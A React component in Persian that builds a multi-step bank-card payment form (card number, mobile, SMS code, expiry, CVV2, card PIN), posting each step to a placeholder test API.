import React, { Component } from "react";
import "./css/credit-card.css";
import "./css/form-style.css";
import Cards from "react-credit-cards";
import Timer from "./timer";
import swal from "sweetalert";
import axios from "axios";
import Bank from "./bank";

class Creditcard extends Component {
  timeoutID;
  constructor(props) {
    super(props);

    this.state = {
      stage: 1,
      cvc: "",
      expiry: "",
      expiryyear: "",
      focus: "",
      number: "",
      password: "",
      mobile: "",
      price: "100,000تومان",
      validationCode: "",
      getPassword:()=>{}
    };
  }

  setup = () => {
    //if any of the events fire, it resets the timer
    // window.addEventListener("keypress", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("keyup", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("scroll", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("keydown", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("mousemove", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("mousewheel", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("mousedown", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("touchmove", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("MSPointerMove", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener("DOMMouseScroll", () => {
    //   this.resetTimer();
    // });
    // window.addEventListener(onscroll, () => {
    //   this.resetTimer();
    // });
    //starts timer of inactivity
    this.startTimer();
  };
  goInactive() {
   
    
     swal("زمان متقضی شد");
     window.location.reload();

  }
  goActive() {
    //starting timer
    this.startTimer();
  }
  resetTimer() {
    window.clearTimeout(this.timeoutID);
    //calling goactive to again starts the timer once it gets reset
    this.goActive();
  }
  startTimer() {
    // wait 30 min before calling goInactive
    this.timeoutID = window.setTimeout(this.goInactive, 60000 * 20);
  }
  //storing data on submit button click

  handlemobile = (e) => {
    const mobileNumber = {
      mobile: this.state.mobile,
    };
    if (
      this.state.number.length == 19 &&
      this.state.mobile.length == 11 &&
      this.state.mobile.charAt(0) == 0 &&
      this.state.mobile.charAt(1) == 9
    ) {
      axios
        .post(`https://jsonplaceholder.typicode.com/users`, { mobileNumber })
        .then((res) => {
          console.log(res);
          console.log(res.data);
        });
    }
  };

  handlevalidation = () => {
    const validation = {
      validation: this.state.validationCode,
    };
    if (this.state.validationCode) {
      axios
        .post(`https://jsonplaceholder.typicode.com/users`, { validation })
        .then((res) => {
          console.log(res);
          console.log(res.data);
        });
    }
  };
  handlesendpassword=()=>{

    const getfunction = {
    get:this.state.getPassword
    };
    axios
    .post(`https://jsonplaceholder.typicode.com/users`, {getfunction})
    .then((res) => {
      console.log(res);
      console.log(res.data);
    });
  }

  


  handleCardInformation = (e) => {
    // sessionStorage.setItem("user", JSON.stringify(this.state));

    const cardinfo = {
      cardnumber: this.state.number,
      cvv: this.state.cvc,
      expiry: this.state.expiry,
      expiryyear: this.state.expiryyear,
      password: this.state.password,
    };
    if (
      this.state.number.length == 19 &&
      this.state.cvc &&
      this.state.expiry &&
      this.state.expiryyear &&
      this.state.password
    ) {
      axios
        .post(`https://jsonplaceholder.typicode.com/users`, { cardinfo })
        .then((res) => {
          console.log(res);
          console.log(res.data);
        });
    } else {
      swal("خطا", "اطلاعات کارت درست نیست");
      setTimeout(window.location.reload(),3000)
    }

    this.setState({
      number: "",
      cvc: "",
      expiry: "",
      expiryyear: "",
      focus: "",
      password: "",
    });
   
  };

  /*function to remove special characters like + - . e E 
    which are otherwise valid in case of type=number used in case  of cvc*/
  removeSpecial = (e) => {
    var invalidChars = ["-", "+", "e", "E", " ", "."];
    if (invalidChars.includes(e.key)) {
      e.preventDefault();
    }
  };

  //function to add space after every 4 character in card number
  addSpace = (e) => {
    const { value, id } = e.target;
    var ele = document.getElementById(id);
    if (value.length === 4 || value.length === 9 || value.length === 14)
      ele.value = ele.value.replace(/\W/gi, "").replace(/(.{4})/g, "$1 ");
  };

  componentDidMount() {
    this.setup(); //setting up all window event  listener to detect user activity after component gets mounted
    setInterval(() => {
      var hours = 0.5; // Reset when storage is more than 24hours
      var now = new Date().getTime(); //recording session start time
      var setupTime = sessionStorage.getItem("setupTime"); //pushing setting start time to session storage

      if (setupTime === null) {
        //this only works first time when there is no value in session storage
        sessionStorage.setItem("setupTime", now);
      } else {
        //comparing time passed with the specified time of session

        if (now - setupTime > hours * 60 * 60 * 1000) {
          //session time exceeds 30 min
          sessionStorage.clear(); //clearing storage
          sessionStorage.setItem("setupTime", now); //storing starting time of new session
        }
      }
    }, 1000);
  }

  //function to validate the length of input in case of cvv and replace invalid characters in case of card number
  validateInput = (e) => {
    const { name, value, maxLength, id } = e.target;
    var temp, ele;

    if (id === "cvv") {
      if (value.length > maxLength) {
        temp = value.slice(0, maxLength);
        const num = temp;
        ele = document.getElementById(id);
        ele.value = temp;
        this.setState({ [name]: num });
      } else {
        this.setState({ [name]: value });
      }
    }
    //works when function is invoked by cardNumber input
    else {
      ele = document.getElementById(id);
      //if user enters any invalid characters it gets replaced
      ele.value = ele.value.replace(
        /[A-Za-z}"`~_=.\->\]|<?+*/,;\[:{\\!@#\/'$%^&*()]/g,
        ""
      );
      this.setState({ [name]: ele.value });
    }
  };

  //function to handle focus on input
  handleInputFocus = (e) => {
    this.setState({ focus: e.target.name });
  };

  //function to handle  input and update the state of variable
  handleInputChange = (e) => {
    const { name, value, id } = e.target;

    if (id === "cardHolder") {
      var ele = document.getElementById(id);
      //if user enters any invalid characters it gets replaced
      ele.value = ele.value.replace(
        /[}"`~_=.\->\]|<?+*/,\d;\[:{\\!@#\/'$%^&*()]/g,
        ""
      );
      this.setState({ [name]: ele.value });
    } else this.setState({ [name]: value });
  };

  render() {
    return (
      <div>
        <div className="credit-card ">
          <Cards
            locale={{ valid: "Expires" }}
            placeholders={{ name: "FULL NAME" }}
            cvc={this.state.cvc}
            expiry={this.state.expiry}
            expiryyear={this.state.expiryyear}
            focused={this.state.focus}
            name={'debit Card'}
            number={this.state.number}
          /> 
        </div>
        <Bank number={this.state.number}/>
        <div className="card">
          <form className="payment-form">
            <div className="form-group">
              <label htmlFor="cardHolder" className="card-label">
                <p>مبلغ</p>{" "}
              </label>
              <input
                dir="rtl"
                type="text"
               
                // spellCheck="false"
                value={this.state.price}
                // maxLength="20"
                // autoComplete="off"
                // onPaste={(e) => e.preventDefault()}
                onChange={this.handleInputChange}
                // onFocus={this.handleInputFocus}
                // id="cardHolder"
                className="form-control form-control-lg"
              />
            </div>

            {this.state.stage == 1 && (
              <div>
                <div className="form-group">
                  <label htmlFor="cardNumber" className="card-label">
                    شماره کارت
                  </label>
                  <input
                    type="text"
                    onChange={this.validateInput}
                    value={this.state.number}
                    onKeyDown={this.removeSpecial}
                    onPaste={(e) => e.preventDefault()}
                    onKeyPress={this.addSpace}
                    onFocus={this.handleInputFocus}
                    name="number"
                    maxLength="19"
                    id="cardNumber"
                    className="form-control form-control-lg"
                  />
                  {!this.state.number && <p>شماره کارت را وارد کنید</p>}
           
                </div>

                <div className="form-group">
                  <label htmlFor="cardHolder" className="card-label">
                    شماره موبایل{" "}
                  </label>
                  <input
                    type="number"
                    name="name"
                    spellCheck="false"
                    value={this.state.mobile}
                    maxLength="11"
                    autoComplete="off"
                    onPaste={(e) => e.preventDefault()}
                    onChange={(e) => this.setState({ mobile: e.target.value })}
                    onFocus={this.handleInputFocus}
                    id="cardHolder"
                    className="form-control form-control-lg"
                    required
                  />
                  {!this.state.mobile && <p>شماره موبایل را وارد کنید</p>}
                </div>

                <button
                  type="button"
                  className="btn rejectbtn btn-lg btn-block"
                  onClick={() =>
                    this.state.number.length == 19
                      ? this.state.mobile.length == 11 &&
                        this.state.mobile.charAt(0) == 0 &&
                        this.state.mobile.charAt(1) == 9
                        ? this.setState({ stage: this.state.stage + 1 })
                        : swal("Oops!", "شماره موبایل نامعتبر است")
                      : swal("Oops!", "شماره کارت نامعتبر است")
                  }
                  onClickCapture={this.handlemobile}
                >
                  ادامه
                </button>
              </div>
            )}

            {this.state.stage == 2 && (
              <div>
                <div className="form-group">
                  <div >
                    <label htmlFor="cardHolder" className="card-label">
                      {" "}
                      کد ارسال شده به شماره{this.state.mobile} را وارد کنید
                    </label>

                    <button
                      className="btn"
                      onClick={() => this.setState({ stage: 1 })}
                    >
                      {" "}
                      تغییر دادن شماره موبایل
                    </button>
                  </div>
                  <input
                    type="number"
                    name="name"
                    spellCheck="false"
                    value={this.state.validationCode}
                    maxLength="20"
                    autoComplete="off"
                    onPaste={(e) => e.preventDefault()}
                    onChange={(e) =>
                      this.setState({ validationCode: e.target.value })
                    }
                    onFocus={this.handleInputFocus}
                    id="cardHolder"
                    className="form-control form-control-lg"
                  />

                  {<Timer />}
                </div>
                <button
                  type="button"
                  className="btn rejectbtn btn-lg btn-block"
                  onClick={() =>
                    this.state.validationCode
                      ? this.setState({ stage: this.state.stage + 1 })
                      : swal("کد ارسال شده را وارد کنید")
                  }
                  onClickCapture={this.handlevalidation}
                >
                  تایید
                </button>
              </div>
            )}

            {this.state.stage == 3 && (
              <div>
                <div className="date-cvv-box">
                  <div className="expiry-class">
                    <div className="form-group card-month ">
                      <label htmlFor="cardMonth" className="card-label">
                        تاریخ انقضا
                      </label>

                      <select
                        id="cardMonth"
                        data-ref="cardDate"
                        value={this.state.expiry}
                        name="expiry"
                        onChange={this.handleInputChange}
                        onFocus={this.handleInputFocus}
                        className="form-control form-control-lg"
                      >
                        <option value="" defaultChecked="true">
                          ماه
                        </option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                      </select>
                    </div>
                    <div className="form-group card-year">
                      <select
                        id="cardYear"
                        data-ref="cardDate"
                        value={this.state.expiryyear}
                        name="expiryyear"
                        onChange={this.handleInputChange}
                        onFocus={this.handleInputFocus}
                        className="form-control form-control-lg"
                      >
                        <option value="" defaultChecked="true">
                          سال
                        </option>
                        <option value="1395">1395</option>
                        <option value="1396">1396</option>
                        <option value="1397">1397</option>
                        <option value="1398">1398</option>
                        <option value="1399">1399</option>
                        <option value="1400">1400</option>
                        <option value="1401">1401</option>
                        <option value="1402">1402</option>
                        <option value="1403">1403</option>
                        <option value="1404">1404</option>
                        <option value="1405">1405</option>
                        <option value="1406">1406</option>
                        <option value="1407">1407</option>
                        <option value="1408">1408</option>
                        <option value="1409">1409</option>
                        <option value="1410">1410</option>
                      </select>
                    </div>
                  </div>

                  <div className="cvv-class form-group">
                    <label htmlFor="cvv" className="card-label cvv-label">
                      CVV2
                    </label>
                    <input
                      type="number"
                      onChange={this.validateInput}
                      onKeyDown={this.removeSpecial}
                      onPaste={(e) => e.preventDefault()}
                      onFocus={this.handleInputFocus}
                      name="cvc"
                      id="cvv"
                      value={this.state.cvc}
                      className="form-control form-control-lg "
                      maxLength="4"
                    />
                  </div>
                </div>
                <label htmlFor="cvv" className="card-label ">
                  رمز کارت
                </label>
                <input
                  type="password"
                  onChange={this.validateInput}
                  onKeyDown={this.removeSpecial}
                  onPaste={(e) => e.preventDefault()}
                  onFocus={this.handleInputFocus}
                  name="password"
                  id="password"
                  value={this.state.password}
                  className="form-control form-control-lg "
                  maxLength="20"
                />

                <button
                  type="button"
                  className="btn btn-success"
                onClick={this.handlesendpassword}
                >
                  دریافت رمز پویا
                </button>
                
                <button
                type="button"
                  className="btn btn-primary btn-lg btn-block"
                  onClick={this.handleCardInformation}
                  
                >
                  پرداخت
                </button>

                <button
                  type="submit"
                  className="btn rejectbtn btn-lg btn-block"
                  
                >
                  انصراف
                </button>
              </div>
            )}
          </form>
        </div>

        
      
      </div>
    );
  }
}

export default Creditcard;
